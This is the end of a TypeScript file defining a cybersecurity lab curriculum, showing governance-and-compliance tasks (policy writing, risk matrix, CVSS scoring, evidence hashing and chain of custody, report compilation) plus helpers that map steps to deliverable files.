        command: 'cat > Lab_Security_Policy_v1.0.md << EOF\n# Lab Security Policy\n- No root login over SSH\n- Firewall required\n- Logging enabled\nEOF',
        commandExplanation: 'A here-doc writes the first formal policy file, capturing the baseline rules the lab must follow.',
        commandFlags: [
          { flag: 'cat >', meaning: 'Write the following input to a file (overwrites it).' },
          { flag: '<< EOF … EOF', meaning: 'Here-document: send every line until EOF as input.' },
        ],
        expectedOutput: 'Policy document created',
        outputExplanation: 'The file `Lab_Security_Policy_v1.0.md` now exists; open it to confirm each rule (no root SSH, firewall, logging) is captured as enforceable policy.',
        whatItMeans: 'Formal policy enforces controls and expectations.',
        frameworks: ['ISO_27001'],
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'grc-w2-risk',
    role: 'grc',
    week: 2,
    title: 'Risk Matrix & Assessment',
    objective: 'Build risk matrix from vulnerability assessment results.',
    frameworks: ['NIST_CSF', 'CVSS'],
    deliverables: ['Risk_Matrix.md', 'Vulnerability_Assessment.md'],
    steps: [
      {
        id: 'grc-w2-s1',
        title: 'Collect Vulnerability Data',
        description: 'Gather nmap and nikto results from Red.',
        command: 'cat Red_w2_findings.txt',
        commandExplanation: '`cat` displays the Red team Week 2 findings file so you have the raw vulnerability data needed to score risk.',
        commandFlags: [
          { flag: 'cat', meaning: 'Print a file’s contents to the screen.' },
          { flag: 'Red_w2_findings.txt', meaning: 'The Red team’s Week 2 findings file.' },
        ],
        expectedOutput: 'Vulnerability list with descriptions',
        outputExplanation: 'You should see each discovered vulnerability with a short description — this is the input list you will rate for likelihood and impact.',
        whatItMeans: 'Input for risk calculation.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'grc-w2-s2',
        title: 'Create Risk Matrix',
        description: 'Build Likelihood × Impact matrix.',
        command: 'cat > risk_matrix.md << EOF\n| Vuln | Likelihood | Impact | Risk |\n| SSH Password | High | High | Critical |\nEOF',
        commandExplanation: 'A here-doc creates `risk_matrix.md` containing a Markdown table; each row rates a vulnerability Likelihood × Impact to derive an overall Risk level.',
        commandFlags: [
          { flag: 'cat >', meaning: 'Write the following input to a file (overwrites it).' },
          { flag: '<< EOF … EOF', meaning: 'Here-document: send every line until EOF as input.' },
        ],
        expectedOutput: 'Risk matrix table',
        outputExplanation: 'Rendered, the table ranks risks (e.g. SSH password auth = Critical), making it clear what to remediate first.',
        whatItMeans: 'Prioritizes risks for remediation.',
        frameworks: ['NIST_CSF'],
        isEvidenceStep: true
      },
      {
        id: 'grc-w2-s3',
        title: 'Assign CVSS Scores',
        description: 'Calculate CVSS severity for each vulnerability.',
        command: 'echo "SSH Brute Force: CVSS 7.5 (High)" >> cvss_scores.txt',
        commandExplanation: '`echo ... >> cvss_scores.txt` appends a CVSS score line; 7.5 falls in the High band (7.0–8.9), giving the finding a standardized severity number.',
        commandFlags: [
          { flag: 'echo', meaning: 'Print the given text.' },
          { flag: '>> cvss_scores.txt', meaning: 'Append the score line to the file (keeps existing content).' },
        ],
        expectedOutput: 'CVSS scores assigned',
        outputExplanation: 'Silent on screen; `cat cvss_scores.txt` lists each finding with its CVSS score and severity band for objective prioritization.',
        whatItMeans: 'Standardized severity helps prioritization.',
        frameworks: ['CVSS'],
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'grc-w3-custody',
    role: 'grc',
    week: 3,
    title: 'Evidence & Chain of Custody',
    objective: 'Document and verify evidence integrity.',
    frameworks: ['NIST_800_61', 'ISO_27001'],
    deliverables: ['Evidence_Log.md', 'Chain_of_Custody.txt', 'Findings_Summary.md'],
    steps: [
      {
        id: 'grc-w3-s1',
        title: 'Receive Artifacts from Team',
        description: 'Collect all evidence from Red and Blue.',
        command: 'ls -la /team-artifacts/week-3/ | tee artifact_log.txt',
        commandExplanation: '`ls -la` lists every file with size, permissions and timestamps; piping to `tee` prints it *and* saves a copy to `artifact_log.txt` as the intake record.',
        commandFlags: [
          { flag: 'ls -la', meaning: 'List all files with size, permissions and timestamps.' },
          { flag: '| tee artifact_log.txt', meaning: 'Print to screen and save a copy to a file.' },
        ],
        expectedOutput: 'File list with timestamps',
        outputExplanation: 'Each row shows a file plus its modification time — that timestamped inventory is the first link in the chain of custody.',
        whatItMeans: 'Inventory of all evidence collected.',
        frameworks: ['NIST_800_61']
      },
      {
        id: 'grc-w3-s2',
        title: 'Hash Evidence Files',
        description: 'Create SHA256 hashes for integrity verification.',
        command: 'sha256sum attack_capture.pcap Blue_w3_logs.txt Red_w3_proof.pdf > evidence_hashes.txt',
        commandExplanation: '`sha256sum` computes a unique cryptographic fingerprint for each listed file; `> evidence_hashes.txt` stores them so any later change to a file can be detected.',
        commandFlags: [
          { flag: 'sha256sum', meaning: 'Compute a SHA-256 fingerprint of each file.' },
          { flag: '> evidence_hashes.txt', meaning: 'Save the hashes to a file for integrity checks.' },
        ],
        expectedOutput: 'Hash file created',
        outputExplanation: 'The file holds a 64-character hash next to each filename; re-running the command later must produce identical hashes to prove nothing was altered.',
        whatItMeans: 'Proves evidence has not been tampered with.',
        frameworks: ['NIST_800_61'],
        isEvidenceStep: true
      },
      {
        id: 'grc-w3-s3',
        title: 'Create Evidence Log',
        description: 'Document who collected each piece of evidence.',
        command: 'cat > evidence_log.md << EOF\n# Evidence Log\n| Item | Collected By | Date | SHA256 |\nEOF',
        commandExplanation: 'A here-doc starts `evidence_log.md` with a table header recording, for each item, who collected it, when, and its hash.',
        commandFlags: [
          { flag: 'cat >', meaning: 'Write the following input to a file (overwrites it).' },
          { flag: '<< EOF … EOF', meaning: 'Here-document: send every line until EOF as input.' },
        ],
        expectedOutput: 'Evidence log created',
        outputExplanation: 'The log file now has its column headers; fill one row per artifact to complete a defensible chain of custody.',
        whatItMeans: 'Chain of custody required for forensics.',
        frameworks: ['NIST_800_61'],
        isEvidenceStep: true
      },
      {
        id: 'grc-w3-s4',
        title: 'Compile Team Package',
        description: 'Bundle all evidence for final report.',
        command: 'tar -czf Team_Capstone_Week3.tar.gz *.md *.txt *.pcap',
        commandExplanation: '`tar -czf` bundles files into one archive: `c` create, `z` gzip-compress, `f` set the filename; the wildcards pull in all Markdown, text and pcap evidence.',
        commandFlags: [
          { flag: 'tar', meaning: 'Bundle files into one archive.' },
          { flag: '-c', meaning: 'Create a new archive.' },
          { flag: '-z', meaning: 'Compress it with gzip.' },
          { flag: '-f <name>', meaning: 'Set the archive filename.' },
          { flag: '*.md *.txt *.pcap', meaning: 'Include all Markdown, text and pcap files.' },
        ],
        expectedOutput: 'Archive created',
        outputExplanation: 'A `Team_Capstone_Week3.tar.gz` file appears; run `tar -tzf` on it to verify every expected artifact is inside before submitting.',
        whatItMeans: 'Deliverable ready for grading.',
        frameworks: ['ISO_27001']
      }
    ]
  },
  {
    id: 'grc-w4-report',
    role: 'grc',
    week: 4,
    title: 'Final Report & Presentation',
    objective: 'Compile and present all findings, recommendations, and incident response.',
    frameworks: ['ISO_27001', 'NIST_CSF'],
    deliverables: ['Final_Report.pdf', 'Findings.md', 'Recommendations.md', 'Briefing_Slides.pptx'],
    steps: [
      {
        id: 'grc-w4-s1',
        title: 'Compile Findings Document',
        description: 'Aggregate findings from all three gates.',
        command: 'cat > findings.md << EOF\n# Findings Summary\n## Critical\n- SSH Password Authentication\n## High\n- SQL Injection Vulnerability\nEOF',
        commandExplanation: 'A here-doc assembles `findings.md`, grouping discoveries under severity headings (Critical, High) for the final report.',
        commandFlags: [
          { flag: 'cat >', meaning: 'Write the following input to a file (overwrites it).' },
          { flag: '<< EOF … EOF', meaning: 'Here-document: send every line until EOF as input.' },
        ],
        expectedOutput: 'Findings document',
        outputExplanation: 'Open the file to confirm each finding sits under the right severity — this becomes the backbone of the report.',
        whatItMeans: 'Comprehensive vulnerability report.',
        frameworks: ['ISO_27001']
      },
      {
        id: 'grc-w4-s2',
        title: 'Create Recommendations',
        description: 'Propose mitigations and controls.',
        command: 'cat > recommendations.md << EOF\n# Recommendations\n1. Require SSH key-only authentication\n2. Implement WAF for web application\n3. Deploy vulnerability management program\nEOF',
        commandExplanation: 'A here-doc writes `recommendations.md`, pairing each finding with a concrete, prioritized fix.',
        commandFlags: [
          { flag: 'cat >', meaning: 'Write the following input to a file (overwrites it).' },
          { flag: '<< EOF … EOF', meaning: 'Here-document: send every line until EOF as input.' },
        ],
        expectedOutput: 'Recommendations list',
        outputExplanation: 'The numbered list should map back to your findings — every Critical/High risk needs a matching recommendation.',
        whatItMeans: 'Actionable steps to reduce risk.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'grc-w4-s3',
        title: 'Compile Final Report',
        description: 'Merge all sections into final report.',
        command: 'pandoc *.md -o Final_Report.pdf',
        commandExplanation: '`pandoc` converts documents between formats; here it merges all Markdown files (`*.md`) and renders them into a single `Final_Report.pdf` (`-o` sets the output).',
        commandFlags: [
          { flag: 'pandoc', meaning: 'Convert documents between formats.' },
          { flag: '*.md', meaning: 'All Markdown files, merged in order.' },
          { flag: '-o Final_Report.pdf', meaning: 'Output a single PDF.' },
        ],
        expectedOutput: 'PDF report created',
        outputExplanation: 'On success it returns silently and `Final_Report.pdf` appears — open it to confirm sections merged in the right order and formatting is clean.',
        whatItMeans: 'Professional deliverable for stakeholders.',
        frameworks: ['ISO_27001'],
        isEvidenceStep: true
      }
    ]
  }
];

// Maps each evidence step to the deliverable file it contributes toward.
// Used by the guided task runner to show "this step produces <file>".
export const STEP_DELIVERABLES: Record<string, string> = {
  // Red
  'red-w1-s3': 'Recon_Findings.md',
  'red-w1-s5': 'Asset_List.md',
  'red-w2-s1': 'Nmap_Scan.txt',
  'red-w2-s2': 'Nikto_Report.txt',
  'red-w3-s1': 'SQL_Injection_Proof.txt',
  'red-w3-s2': 'Brute_Force_Proof.txt',
  'red-w3-s3': 'Reverse_Shell_Proof.txt',
  'red-w3-s4': 'Evidence_Photos.zip',
  // Blue
  'blue-w1-s3': 'UFW_Status.txt',
  'blue-w1-s4': 'Hardening_Checklist.txt',
  'blue-w1-s5': 'Lynis_Report.html',
  'blue-w2-s1': 'Baseline_Traffic.pcap',
  'blue-w2-s3': 'Detection_Rules.txt',
  'blue-w3-s1': 'Attack_Pcap.pcap',
  'blue-w3-s2': 'Attack_Logs.txt',
  'blue-w3-s3': 'Incident_Response.txt',
  // GRC
  'grc-w1-s2': 'Framework_Mapping.md',
  'grc-w1-s3': 'Framework_Mapping.md',
  'grc-w1-s4': 'Lab_Security_Policy_v1.0.md',
  'grc-w2-s2': 'Risk_Matrix.md',
  'grc-w2-s3': 'Vulnerability_Assessment.md',
  'grc-w3-s2': 'Evidence_Log.md',
  'grc-w3-s3': 'Evidence_Log.md',
  'grc-w4-s3': 'Final_Report.pdf',
};

export function getStepDeliverable(stepId: string): string | undefined {
  return STEP_DELIVERABLES[stepId];
}

// All deliverable filenames expected from a role for a given week.
export function getDeliverablesForWeek(role: 'red' | 'blue' | 'grc', week: number): string[] {
  const tasks = getTasksByRole(role, week);
  const set = new Set<string>();
  tasks.forEach((t) => t.deliverables.forEach((d) => set.add(d)));
  return Array.from(set);
}

// Export all tasks
export const ALL_TASKS: Task[] = [...RED_TASKS, ...BLUE_TASKS, ...GRC_TASKS];

export function getTasksByRole(role: 'red' | 'blue' | 'grc', week?: number): Task[] {
  let tasks = ALL_TASKS.filter(t => t.role === role);
  if (week) {
    tasks = tasks.filter(t => t.week === week);
  }
  return tasks;
}

export function getTaskById(id: string): Task | undefined {
  return ALL_TASKS.find(t => t.id === id);
}

export function getWeekTasks(week: number): Task[] {
  return ALL_TASKS.filter(t => t.week === week);
}
